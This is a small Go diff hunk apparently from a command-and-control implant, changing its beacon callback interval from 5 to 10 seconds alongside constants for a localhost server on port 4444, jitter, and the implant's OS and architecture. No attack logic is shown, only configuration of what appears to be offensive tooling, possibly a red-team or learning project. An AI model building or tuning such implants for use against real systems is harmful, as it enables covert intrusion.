@@ -20,7 +20,7 @@ const (
 	serverIp    string = "127.0.0.1"
 	serverPort  int    = 4444
 
-	callbackInterval int    = 5
+	callbackInterval int    = 10
 	callbackJitter   int    = 2
 	implantOs        string = runtime.GOOS
 	ImplantArch      string = runtime.GOARCH
